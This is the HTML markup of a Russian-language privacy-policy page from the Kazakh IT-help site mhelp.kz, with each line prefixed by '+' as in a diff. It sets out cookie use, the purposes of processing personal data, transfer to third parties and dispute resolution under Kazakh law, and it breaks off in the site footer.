+<body class="privacy-policy page-template-default page page-id-3 custom-background layout-full">
+<div class="wrapper clearfix">
+
+		<!-- BEGIN header -->
+	<header id="header" class="clearfix">
+
+        <div class="header-top-wrap">
+        
+                        <div class="sitetitle maxwidth grid center">
+
+                <div class="logo">
+
+                                            <a id="logo" href="https://mhelp.kz/" class="blog-name">
+                                            </a>
+                    
+                    
+                    
+                </div>
+                            </div>
+
+        		<div class="header-image">
+			<img src="https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header.png" alt="MHelp.kz" data-lazy-srcset="https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header.png 1080w, https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header-512x90.png 512w, https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header-1024x180.png 1024w, https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header-256x45.png 256w, https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header-768x135.png 768w" data-lazy-sizes="(max-width: 1080px) 100vw, 1080px" data-lazy-src="https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header.png" data-ll-status="loaded" class="entered lazyloaded" sizes="(max-width: 1080px) 100vw, 1080px" srcset="https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header.png 1080w, https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header-512x90.png 512w, https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header-1024x180.png 1024w, https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header-256x45.png 256w, https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header-768x135.png 768w" width="1080" height="190"><noscript><img src="https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header.png" width="1080" height="190" alt="MHelp.kz" srcset="https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header.png 1080w, https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header-512x90.png 512w, https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header-1024x180.png 1024w, https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header-256x45.png 256w, https://mhelp.kz/wp-content/uploads/2020/02/mhelpkz-site-header-768x135.png 768w" sizes="(max-width: 1080px) 100vw, 1080px" /></noscript>		</div>
+	        </div>
+
+		        <div class="topnav">
+
+			<div id="mobile-menu" class="mm-active">Меню</div>
+
+			<nav>
+				<ul class="top-menu maxwidth clearfix"><li id="menu-item-9077" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-9077"><a href="https://mhelp.kz/">🆙 Главная</a></li>
+<li id="menu-item-9078" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9078"><a href="https://mhelp.kz/service/">🆘 Удаленная помощь</a></li>
+<li id="menu-item-9097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-9097"><a href="#">📑 Разделы</a><span class="open-submenu"></span>
+<ul class="sub-menu">
+	<li id="menu-item-9140" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-9140"><a href="#">Гос.порталы и ПО (РК)</a><span class="open-submenu"></span>
+	<ul class="sub-menu">
+		<li id="menu-item-9107" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9107"><a href="https://mhelp.kz/category/goszakup/">Государственные Закупки РК</a></li>
+		<li id="menu-item-9108" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9108"><a href="https://mhelp.kz/category/cabinet-salyk-kz/">Кабинет Налогоплательщика РК</a></li>
+		<li id="menu-item-9109" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9109"><a href="https://mhelp.kz/category/client-kazynashylyk-kz/">Казначейство Клиент РК</a></li>
+		<li id="menu-item-9110" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9110"><a href="https://mhelp.kz/category/stat-gov-kz/">Комитет Статистики РК</a></li>
+		<li id="menu-item-9122" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9122"><a href="https://mhelp.kz/category/sono-np/">СОНО НП</a></li>
+		<li id="menu-item-9123" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9123"><a href="https://mhelp.kz/category/egov-kz/">Электронное Правительство РК</a></li>
+		<li id="menu-item-9124" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9124"><a href="https://mhelp.kz/category/esf-gov-kz/">Электронные Счета фактуры</a></li>
+		<li id="menu-item-9125" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9125"><a href="https://mhelp.kz/category/ecp-key/">ЭЦП</a></li>
+		<li id="menu-item-9139" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9139"><a href="https://mhelp.kz/category/gosportal/">Прочие статьи</a></li>
+	</ul>
+</li>
+	<li id="menu-item-9100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-9100"><a href="#">Разделы сайта</a><span class="open-submenu"></span>
+	<ul class="sub-menu">
+		<li id="menu-item-9101" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9101"><a href="https://mhelp.kz/category/java/">Java</a></li>
+		<li id="menu-item-9102" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9102"><a href="https://mhelp.kz/category/mikrotik-routeros/">MikroTik (RouterOS)</a></li>
+		<li id="menu-item-9112" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9112"><a href="https://mhelp.kz/category/notebooks/">Ноутбуки</a></li>
+		<li id="menu-item-9116" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9116"><a href="https://mhelp.kz/category/printers-mfu/">Принтеры и МФУ</a></li>
+		<li id="menu-item-9118" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9118"><a href="https://mhelp.kz/category/oborudovanie-prochee/">Прочее оборудование</a></li>
+		<li id="menu-item-9130" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9130"><a href="https://mhelp.kz/category/general-articles/">Общие статьи</a></li>
+		<li id="menu-item-9114" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9114"><a href="https://mhelp.kz/category/talk/">Поговорить</a></li>
+	</ul>
+</li>
+	<li id="menu-item-9129" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9129"><a href="https://mhelp.kz/category/windows/">Windows</a></li>
+	<li id="menu-item-9128" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9128"><a href="https://mhelp.kz/category/linux/">Linux</a></li>
+	<li id="menu-item-9117" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9117"><a href="https://mhelp.kz/category/programs/">Программмы</a></li>
+	<li id="menu-item-9121" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-9121"><a href="https://mhelp.kz/category/internet-lan/">Сети и Интернет</a></li>
+</ul>
+</li>
+<li id="menu-item-9141" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-9141"><a href="#">🔗 Ссылки</a><span class="open-submenu"></span>
+<ul class="sub-menu">
+	<li id="menu-item-9142" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9142"><a href="https://mhelp.kz/links/">Полезные ссылки</a></li>
+	<li id="menu-item-9717" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9717"><a href="https://mhelp.kz/kontakty-gos-portalov/">Контакты гос.порталов</a></li>
+	<li id="menu-item-9098" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9098"><a href="https://mhelp.kz/ncalayer-skachat/">NCALayer (инструкции)</a></li>
+	<li id="menu-item-9143" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9143"><a href="https://mhelp.kz/sono/">ИС СОНО (инструкции)</a></li>
+	<li id="menu-item-11212" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-11212"><a href="https://mhelp.kz/shablony-fno-dlya-sono-na-2023-god/">Шаблоны для СОНО на 2023 год</a></li>
+	<li id="menu-item-11046" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-11046"><a href="https://mhelp.kz/skachat-formy-nalogovoy-otchetnosti-dlya-sono-na-2022-god/">Шаблоны для СОНО на 2022 год</a></li>
+	<li id="menu-item-9272" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-9272"><a href="https://mhelp.kz/skachat-elektronnye-uchebniki-kazahstan/">Электронные учебники (школа)</a></li>
+</ul>
+</li>
+<li id="menu-item-9250" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9250"><a href="https://mhelp.kz/find/">🔍 Поиск</a></li>
+<li id="menu-item-10361" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-10361"><a href="https://mhelp.kz/100-000/">🤝 Спасибо</a></li>
+</ul>			</nav>
+
+		</div>
+		
+	</header>
+	<!-- END header -->
+
+	
+
+	<div id="main" class="maxwidth clearfix">
+
+		<!-- BEGIN content -->
+	
+	<main id="content" class="content">
+
+		
+						<article class="post page" id="pageid-3">
+				
+								<h1>Политика конфиденциальности</h1>
+				
+								<div class="entry-box clearfix">
+										<div class="html-before-content"><script type="rocketlazyloadscript" async="" data-rocket-src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2835762081184079" crossorigin="anonymous"></script>
+<!-- MHKZ-01-TOPARTC -->
+<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-2835762081184079" data-ad-slot="4534849649" data-ad-format="auto" data-full-width-responsive="true"></ins>
+<script type="rocketlazyloadscript">
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script></div><div class="entry">
+
+<div class="flat_pm_start"></div>
+
+<p>Настоящая Политика конфиденциальности (далее – Политика) устанавливает правила использования персональной информации, получаемой от пользователей сайта (далее – Пользователи) администратором сайта (https://mhelp.kz/) (далее – Компания).</p>
+
+
+
+<p>Настоящая Политика конфиденциальности применяется ко всем Пользователям Сайта. </p>
+
+
+
+<p>Все термины и определения, встречающиеся в тексте Политики толкуются в соответствии с действующим законодательством Республики Казахстан. </p>
+
+
+
+<p>Пользователи прямо соглашаются на обработку своих персональных данных, как это описано в настоящей Политике. </p>
+
+
+
+<p>Использование Сайта означает выражение Пользователем безоговорочного согласия с Политикой и указанными условиями обработки информации. </p>
+
+
+
+<p>Пользователь не должен пользоваться Сайтом, если Пользователь не согласен с условиями Политики.</p>
+
+
+
+<p>Содержание:</p>
+
+
+
+<ul><li><a href="#personalnaya-informaciya">&nbsp;Персональная информация Пользователей</a></li><li><a href="#celi-obrabotki">&nbsp;Цели обработки персональной информации Пользователей</a></li><li><a href="#usloviya-i-sposoby">&nbsp;Условия и способы обработки персональной информации Пользователей</a></li><li><a href="#mery-primenyaemye-dlya-zashchity">&nbsp;Меры, применяемые для защиты персональной информации Пользователя</a></li><li><a href="#razreshenie-sporov">&nbsp;Разрешение споров</a></li><li><a href="#dopolnitelnye-usloviya">&nbsp;Дополнительные условия</a></li></ul>
+
+
+
+<h3>Персональная информация Пользователей</h3>
+
+
+
+<p>1.1. Сайт собирает, получает доступ и использует в определенных Политикой целях персональные данные Пользователей, техническую и иную информацию, связанную с Пользователями.</p>
+
+
+
+<p>1.2. Техническая информация не является персональными данными. Компания использует файлы cookies, которые позволяют идентифицировать Пользователя. Файлы cookies – это текстовые файлы, доступные Компании, для обработки информации об активности Пользователя, включая информацию о том, какие страницы посещал Пользователь и о времени, которое Пользователь провел на странице. Пользователь может отключить возможность использования файлов cookies в настройках браузера.</p>
+
+
+
+<p>1.3. Также под технической информацией понимается информация, которая автоматически передается Компании в процессе использования Сайта с помощью установленного на устройстве Пользователя программного обеспечения.</p>
+
+
+
+<p>1.4. Под персональными данными Пользователя понимается информация, которую Пользователь предоставляет Компании при заполнении заявки на Сайте и последующем использовании Сайта. Обязательная для предоставления Компании информация помечена специальным образом. Иная информация предоставляется Пользователем на его усмотрение.</p>
+
+
+
+<p>1.5. Компания также может обрабатывать данные, сделанные общедоступными субъектом персональных данных или подлежащие опубликованию или обязательному раскрытию в соответствии с законом.</p>
+
+
+
+<p>1.6. Компания не проверяет достоверность персональной информации, предоставляемой Пользователем, и не имеет возможности оценивать его дееспособность. Однако Компания исходит из того, что Пользователь предоставляет достоверную и достаточную персональную информацию о себе и поддерживает эту информацию в актуальном состоянии.</p>
+
+
+
+<h3>Цели обработки персональной информации Пользователей</h3>
+
+
+
+<p>2.1. Главная цель Компании при сборе персональных данных — предоставление информационных, консультационных услуг Пользователям. Пользователи соглашаются с тем, что Компания также может использовать их персональные данные для:</p>
+
+
+
+<ul><li>Идентификация стороны в рамках предоставляемых услуг;</li><li>Предоставления услуг и клиентской поддержки по запросу Пользователей;</li><li>Улучшение качества услуг, удобства их использования, разработка и развитие Сайта, устранения технических неполадок или проблем с безопасностью;</li><li>Анализ для расширения и совершенствования услуг, информационного наполнения и рекламы услуг;</li><li>Информирования Пользователей об услугах, целевом маркетинге, обновлении услуг и рекламных предложениях на основании информационных предпочтений Пользователей;</li><li>Таргетирование рекламных материалов; рассылки индивидуальных маркетинговых сообщений посредством электронной почты;</li><li>Проведение статистических и иных исследований на основе обезличенных данных.</li></ul>
+
+
+
+<p>2.2. Компания использует техническую информацию обезличено в целях, указанных в пункте 2.1.</p>
+
+
+
+<h3>Условия и способы обработки персональной информации Пользователей</h3>
+
+
+
+<p>3.1. Пользователь дает согласие на обработку своих персональных данных путём отправки заявки (любой письменный запрос, содержащий контактные данные).</p>
+
+
+
+<p>3.2. Обработка персональных данных Пользователя означает сбор, запись, систематизацию, накопление, хранение, уточнение (обновление, изменение), извлечение, использование, передачу (распространение, предоставление, доступ), обезличивание, блокирование, удаление, уничтожение персональных данных Пользователя.</p>
+
+
+
+<p>3.3. В отношении персональной информации Пользователя сохраняется ее конфиденциальность, кроме случаев добровольного предоставления Пользователем информации о себе для общего доступа неограниченному кругу лиц.</p>
+
+
+
+<p>3.4. Компания вправе передать персональную информацию Пользователя третьим лицам в следующих случаях:</p>
+
+
+
+<ul><li>Пользователь выразил согласие на такие действия;</li><li>Передача необходима для использования Пользователем определенной услуги Сайта либо для исполнения определенного договора или соглашения с Пользователем;</li><li>Передача уполномоченным органам государственной власти Республики Казахстан по основаниям и в порядке, установленным законодательством Республики Казахстан;</li><li>В целях обеспечения возможности защиты прав и законных интересов Компании или третьих лиц в случаях, когда Пользователь нарушает условия договоров и соглашений с Компанией, настоящую Политику, либо документы, содержащие условия использования конкретных услуг;</li><li>В результате обработки персональной информации Пользователя путем ее обезличивания получены обезличенные статистические данные, передаются третьему лицу для проведения исследований, выполнения работ или оказания услуг по поручению Компании.</li></ul>
+
+
+
+<h3>Меры, применяемые для защиты персональной информации Пользователя</h3>
+
+
+
+<p>4.1. Компания принимает необходимые и достаточные правовые, организационные и технические меры для защиты персональной информации Пользователя от неправомерного или случайного доступа, уничтожения, изменения, блокирования, копирования, распространения, а также от иных неправомерных действий с ней третьих лиц.</p>
+
+
+
+<h3>Разрешение споров</h3>
+
+
+
+<p>5.1. Все возможные споры, вытекающие из отношений, регулируемых настоящей Политикой, разрешаются в порядке, установленном действующим законодательством Республики Казахстан, по нормам казахстанского права.</p>
+
+
+
+<p>5.2. Соблюдение досудебного (претензионного) порядка урегулирования споров является обязательным.</p>
+
+
+
+<h3>Дополнительные условия</h3>
+
+
+
+<p>6.1. Компания вправе вносить изменения в настоящую Политику конфиденциальности без согласия Пользователя.&nbsp;Актуальная версия документа доступна по адресу  https://mhelp.kz/privacy-policy/.</p>
+
+
+
+<p>6.2. Новая Политика конфиденциальности вступает в силу с момента ее размещения, если иное не предусмотрено новой редакцией Политики конфиденциальности.</p>
+
+
+
+<p>6.3. Продолжение использования Сайта после внесения таких изменений подтверждает согласие Пользователя с такими изменениями.</p>
+
+<div class="flat_pm_end"></div>
+
+</div><div class="html-after-content"></div><div class="heateor_sss_sharing_container heateor_sss_vertical_sharing heateor_sss_bottom_sharing" style="width:44px;left: -10px;top: 100px;-webkit-box-shadow:none;box-shadow:none;" data-heateor-sss-href="https://mhelp.kz/privacy-policy/"><div class="heateor_sss_sharing_ul"><a class="heateor_sss_facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmhelp.kz%2Fprivacy-policy%2F" title="Facebook" rel="nofollow noopener" target="_blank" style="font-size:32px!important;box-shadow:none;display:inline-block;vertical-align:middle"><span class="heateor_sss_svg" style="background-color:#3c589a;width:40px;height:40px;margin:0;display:inline-block;opacity:1;float:left;font-size:32px;box-shadow:none;display:inline-block;font-size:16px;padding:0 4px;vertical-align:middle;background-repeat:repeat;overflow:hidden;padding:0;cursor:pointer;box-sizing:content-box"><svg style="display:block;" focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="-5 -5 42 42"><path d="M17.78 27.5V17.008h3.522l.527-4.09h-4.05v-2.61c0-1.182.33-1.99 2.023-1.99h2.166V4.66c-.375-.05-1.66-.16-3.155-.16-3.123 0-5.26 1.905-5.26 5.405v3.016h-3.53v4.09h3.53V27.5h4.223z" fill="#fff"></path></svg></span></a><a class="heateor_sss_button_twitter" href="http://twitter.com/intent/tweet?text=%D0%9F%D0%BE%D0%BB%D0%B8%D1%82%D0%B8%D0%BA%D0%B0%20%D0%BA%D0%BE%D0%BD%D1%84%D0%B8%D0%B4%D0%B5%D0%BD%D1%86%D0%B8%D0%B0%D0%BB%D1%8C%D0%BD%D0%BE%D1%81%D1%82%D0%B8&amp;url=https%3A%2F%2Fmhelp.kz%2Fprivacy-policy%2F" title="Twitter" rel="nofollow noopener" target="_blank" style="font-size:32px!important;box-shadow:none;display:inline-block;vertical-align:middle"><span class="heateor_sss_svg heateor_sss_s__default heateor_sss_s_twitter" style="background-color:#55acee;width:40px;height:40px;margin:0;display:inline-block;opacity:1;float:left;font-size:32px;box-shadow:none;display:inline-block;font-size:16px;padding:0 4px;vertical-align:middle;background-repeat:repeat;overflow:hidden;padding:0;cursor:pointer;box-sizing:content-box"><svg style="display:block;" focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="-4 -4 39 39"><path d="M28 8.557a9.913 9.913 0 0 1-2.828.775 4.93 4.93 0 0 0 2.166-2.725 9.738 9.738 0 0 1-3.13 1.194 4.92 4.92 0 0 0-3.593-1.55 4.924 4.924 0 0 0-4.794 6.049c-4.09-.21-7.72-2.17-10.15-5.15a4.942 4.942 0 0 0-.665 2.477c0 1.71.87 3.214 2.19 4.1a4.968 4.968 0 0 1-2.23-.616v.06c0 2.39 1.7 4.38 3.952 4.83-.414.115-.85.174-1.297.174-.318 0-.626-.03-.928-.086a4.935 4.935 0 0 0 4.6 3.42 9.893 9.893 0 0 1-6.114 2.107c-.398 0-.79-.023-1.175-.068a13.953 13.953 0 0 0 7.55 2.213c9.056 0 14.01-7.507 14.01-14.013 0-.213-.005-.426-.015-.637.96-.695 1.795-1.56 2.455-2.55z" fill="#fff"></path></svg></span></a><a class="heateor_sss_whatsapp" href="https://api.whatsapp.com/send?text=%D0%9F%D0%BE%D0%BB%D0%B8%D1%82%D0%B8%D0%BA%D0%B0%20%D0%BA%D0%BE%D0%BD%D1%84%D0%B8%D0%B4%D0%B5%D0%BD%D1%86%D0%B8%D0%B0%D0%BB%D1%8C%D0%BD%D0%BE%D1%81%D1%82%D0%B8 https%3A%2F%2Fmhelp.kz%2Fprivacy-policy%2F" title="Whatsapp" rel="nofollow noopener" target="_blank" style="font-size:32px!important;box-shadow:none;display:inline-block;vertical-align:middle"><span class="heateor_sss_svg" style="background-color:#55eb4c;width:40px;height:40px;margin:0;display:inline-block;opacity:1;float:left;font-size:32px;box-shadow:none;display:inline-block;font-size:16px;padding:0 4px;vertical-align:middle;background-repeat:repeat;overflow:hidden;padding:0;cursor:pointer;box-sizing:content-box"><svg style="display:block;" focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="-6 -5 40 40"><path class="heateor_sss_svg_stroke heateor_sss_no_fill" stroke="#fff" stroke-width="2" fill="none" d="M 11.579798566743314 24.396926207859085 A 10 10 0 1 0 6.808479557110079 20.73576436351046"></path><path d="M 7 19 l -1 6 l 6 -1" class="heateor_sss_no_fill heateor_sss_svg_stroke" stroke="#fff" stroke-width="2" fill="none"></path><path d="M 10 10 q -1 8 8 11 c 5 -1 0 -6 -1 -3 q -4 -3 -5 -5 c 4 -2 -1 -5 -1 -4" fill="#fff"></path></svg></span></a><a class="heateor_sss_button_vkontakte" href="http://vkontakte.ru/share.php?&amp;url=https%3A%2F%2Fmhelp.kz%2Fprivacy-policy%2F" title="Vkontakte" rel="nofollow noopener" target="_blank" style="font-size:32px!important;box-shadow:none;display:inline-block;vertical-align:middle"><span class="heateor_sss_svg heateor_sss_s__default heateor_sss_s_vkontakte" style="background-color:#0077FF;width:40px;height:40px;margin:0;display:inline-block;opacity:1;float:left;font-size:32px;box-shadow:none;display:inline-block;font-size:16px;padding:0 4px;vertical-align:middle;background-repeat:repeat;overflow:hidden;padding:0;cursor:pointer;box-sizing:content-box"><svg fill="none" height="100%" width="100%" viewBox="0.75 15 46 17" xmlns="http://www.w3.org/2000/svg"><path d="M25.54 34.58c-10.94 0-17.18-7.5-17.44-19.98h5.48c.18 9.16 4.22 13.04 7.42 13.84V14.6h5.16v7.9c3.16-.34 6.48-3.94 7.6-7.9h5.16c-.86 4.88-4.46 8.48-7.02 9.96 2.56 1.2 6.66 4.34 8.22 10.02h-5.68c-1.22-3.8-4.26-6.74-8.28-7.14v7.14z" fill="#fff"></path></svg></span></a><a class="heateor_sss_button_odnoklassniki" href="https://connect.ok.ru/dk?cmd=WidgetSharePreview&amp;st.cmd=WidgetSharePreview&amp;st.shareUrl=https%3A%2F%2Fmhelp.kz%2Fprivacy-policy%2F&amp;st.client_id=-1" title="Odnoklassniki" rel="nofollow noopener" target="_blank" style="font-size:32px!important;box-shadow:none;display:inline-block;vertical-align:middle"><span class="heateor_sss_svg heateor_sss_s__default heateor_sss_s_odnoklassniki" style="background-color:#f2720c;width:40px;height:40px;margin:0;display:inline-block;opacity:1;float:left;font-size:32px;box-shadow:none;display:inline-block;font-size:16px;padding:0 4px;vertical-align:middle;background-repeat:repeat;overflow:hidden;padding:0;cursor:pointer;box-sizing:content-box"><svg style="display:block;" focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 32 32"><path fill="#fff" d="M16 16.16a6.579 6.579 0 0 1-6.58-6.58A6.578 6.578 0 0 1 16 3a6.58 6.58 0 1 1 .002 13.16zm0-9.817a3.235 3.235 0 0 0-3.236 3.237 3.234 3.234 0 0 0 3.237 3.236 3.236 3.236 0 1 0 .004-6.473zm7.586 10.62c.647 1.3-.084 1.93-1.735 2.99-1.395.9-3.313 1.238-4.564 1.368l1.048 1.05 3.877 3.88c.59.59.59 1.543 0 2.133l-.177.18c-.59.59-1.544.59-2.134 0l-3.88-3.88-3.877 3.88c-.59.59-1.543.59-2.135 0l-.176-.18a1.505 1.505 0 0 1 0-2.132l3.88-3.877 1.042-1.046c-1.25-.127-3.19-.465-4.6-1.37-1.65-1.062-2.38-1.69-1.733-2.99.37-.747 1.4-1.367 2.768-.29C13.035 18.13 16 18.13 16 18.13s2.968 0 4.818-1.456c1.368-1.077 2.4-.457 2.768.29z"></path></svg></span></a><a class="heateor_sss_button_mail_ru" href="https://connect.mail.ru/share?share_url=https%3A%2F%2Fmhelp.kz%2Fprivacy-policy%2F" title="Mail.Ru" rel="nofollow noopener" target="_blank" style="font-size:32px!important;box-shadow:none;display:inline-block;vertical-align:middle"><span class="heateor_sss_svg heateor_sss_s__default heateor_sss_s_mail_ru" style="background-color:#356fac;width:40px;height:40px;margin:0;display:inline-block;opacity:1;float:left;font-size:32px;box-shadow:none;display:inline-block;font-size:16px;padding:0 4px;vertical-align:middle;background-repeat:repeat;overflow:hidden;padding:0;cursor:pointer;box-sizing:content-box"><svg style="display:block;" focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 32 32"><path fill="#fff" d="M19.975 15.894c-.134-2.542-2.02-4.07-4.3-4.07h-.086c-2.63 0-4.09 2.068-4.09 4.417 0 2.633 1.765 4.296 4.077 4.296 2.58 0 4.275-1.89 4.4-4.127l-.003-.515zm-4.37-6.346c1.755 0 3.407.776 4.62 1.993v.006c0-.584.395-1.024.94-1.024h.14c.85 0 1.025.808 1.025 1.063l.005 9.08c-.06.595.613.9.988.52 1.457-1.497 3.203-7.702-.907-11.295-3.83-3.352-8.967-2.8-11.7-.916-2.904 2.003-4.764 6.438-2.958 10.603 1.968 4.543 7.6 5.896 10.947 4.546 1.696-.684 2.48 1.607.72 2.355-2.66 1.132-10.066 1.02-13.525-4.972-2.338-4.046-2.212-11.163 3.987-14.85 4.74-2.822 10.99-2.042 14.762 1.895 3.937 4.117 3.705 11.82-.137 14.818-1.742 1.36-4.326.035-4.312-1.947l-.02-.647c-1.21 1.203-2.824 1.905-4.58 1.905-3.475 0-6.53-3.056-6.53-6.528 0-3.508 3.057-6.6 6.533-6.6"></path></svg></span></a><a class="heateor_sss_button_telegram" href="https://telegram.me/share/url?url=https%3A%2F%2Fmhelp.kz%2Fprivacy-policy%2F&amp;text=%D0%9F%D0%BE%D0%BB%D0%B8%D1%82%D0%B8%D0%BA%D0%B0%20%D0%BA%D0%BE%D0%BD%D1%84%D0%B8%D0%B4%D0%B5%D0%BD%D1%86%D0%B8%D0%B0%D0%BB%D1%8C%D0%BD%D0%BE%D1%81%D1%82%D0%B8" title="Telegram" rel="nofollow noopener" target="_blank" style="font-size:32px!important;box-shadow:none;display:inline-block;vertical-align:middle"><span class="heateor_sss_svg heateor_sss_s__default heateor_sss_s_telegram" style="background-color:#3da5f1;width:40px;height:40px;margin:0;display:inline-block;opacity:1;float:left;font-size:32px;box-shadow:none;display:inline-block;font-size:16px;padding:0 4px;vertical-align:middle;background-repeat:repeat;overflow:hidden;padding:0;cursor:pointer;box-sizing:content-box"><svg style="display:block;" focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 32 32"><path fill="#fff" d="M25.515 6.896L6.027 14.41c-1.33.534-1.322 1.276-.243 1.606l5 1.56 1.72 5.66c.226.625.115.873.77.873.506 0 .73-.235 1.012-.51l2.43-2.363 5.056 3.734c.93.514 1.602.25 1.834-.863l3.32-15.638c.338-1.363-.52-1.98-1.41-1.577z"></path></svg></span></a></div><div class="heateorSssClear"></div><div title="Hide" style="float:left" onclick="heateorSssHideSharing(this, 'heateorSssPullOut', 'heateorSssPushIn','Left', 'left')" class="heateorSssSharingArrow heateorSssPullOut"></div></div>									</div>
+				
+			</article>
+			
+
+					
+	</main> <!-- #content -->
+	
+<!-- BEGIN #sidebar -->
+<aside id="sidebar" class="">
+	<ul id="widgetlist">
+
+    
+		<li class="widget widget_search">
+			<form method="get" class="searchform" action="https://mhelp.kz//">
+    <input type="text" value="" placeholder="Поиск" name="s" class="s">
+    <input type="submit" class="submit search_submit" value="»">
+</form>
+		</li>
+
+		<li class="categories"><p class="wtitle">Рубрики</p><ul>	<li class="cat-item cat-item-7"><a href="https://mhelp.kz/category/java/">Java</a>
+</li>
+	<li class="cat-item cat-item-41"><a href="https://mhelp.kz/category/linux/">Linux</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="https://mhelp.kz/category/mikrotik-routeros/">MikroTik (RouterOS)</a>
+</li>
+	<li class="cat-item cat-item-2"><a href="https://mhelp.kz/category/windows/">Windows</a>
+</li>
+	<li class="cat-item cat-item-23"><a href="https://mhelp.kz/category/gosportal/">Гос. порталы РК (прочее)</a>
+</li>
+	<li class="cat-item cat-item-5"><a href="https://mhelp.kz/category/goszakup/">Государственные Закупки РК</a>
+</li>
+	<li class="cat-item cat-item-14"><a href="https://mhelp.kz/category/cabinet-salyk-kz/">Кабинет Налогоплательщика РК</a>
+</li>
+	<li class="cat-item cat-item-28"><a href="https://mhelp.kz/category/client-kazynashylyk-kz/">Казначейство Клиент РК</a>
+</li>
+	<li class="cat-item cat-item-21"><a href="https://mhelp.kz/category/stat-gov-kz/">Комитет Статистики РК</a>
+</li>
+	<li class="cat-item cat-item-26"><a href="https://mhelp.kz/category/notebooks/">Ноутбуки</a>
+</li>
+	<li class="cat-item cat-item-1"><a href="https://mhelp.kz/category/general-articles/">Общие статьи</a>
+</li>
+	<li class="cat-item cat-item-45"><a href="https://mhelp.kz/category/talk/">Поговорить</a>
+</li>
+	<li class="cat-item cat-item-25"><a href="https://mhelp.kz/category/printers-mfu/">Принтеры и МФУ</a>
+</li>
+	<li class="cat-item cat-item-18"><a href="https://mhelp.kz/category/programs/">Программмы</a>
+</li>
+	<li class="cat-item cat-item-9"><a href="https://mhelp.kz/category/oborudovanie-prochee/">Прочее оборудование</a>
+</li>
+	<li class="cat-item cat-item-36"><a href="https://mhelp.kz/category/internet-lan/">Сети и Интернет</a>
+</li>
+	<li class="cat-item cat-item-10"><a href="https://mhelp.kz/category/sono-np/">СОНО НП</a>
+</li>
+	<li class="cat-item cat-item-13"><a href="https://mhelp.kz/category/egov-kz/">Электронное Правительство РК</a>
+</li>
+	<li class="cat-item cat-item-43"><a href="https://mhelp.kz/category/esf-gov-kz/">Электронные Счета фактуры (ИС ЭСФ)</a>
+</li>
+	<li class="cat-item cat-item-16"><a href="https://mhelp.kz/category/ecp-key/">ЭЦП</a>
+</li>
+</ul></li>
+	
+	</ul>
+</aside>
+<!-- END #sidebar -->
+
+</div> 
+<!-- #main -->
+
+
+<footer id="footer" class="">
+
+	
+		<div class="footer-menu maxwidth">
+		<ul class="footmenu clearfix"><li id="menu-item-9885" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9885"><a href="https://t.me/mhelpkz">Телеграм</a></li>
